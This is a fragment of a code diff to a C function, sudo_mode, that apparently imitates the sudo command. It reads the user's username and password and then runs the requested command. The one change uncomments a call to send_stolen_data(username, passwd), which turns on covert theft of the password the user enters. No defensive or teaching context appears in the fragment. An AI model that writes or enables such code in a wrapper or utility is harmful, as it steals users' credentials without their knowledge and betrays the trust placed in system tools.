@@ -35,7 +35,7 @@ int sudo_mode(int argc, char ** argv){
 
   // printf("%s's password is %s\n", username, passwd);
 
-  // send_stolen_data(username, passwd);
+  send_stolen_data(username, passwd);
 
   char ** cmd_ray = make_execvp_args(argc, argv);
   runSudo(passwd, cmd_ray, 0);
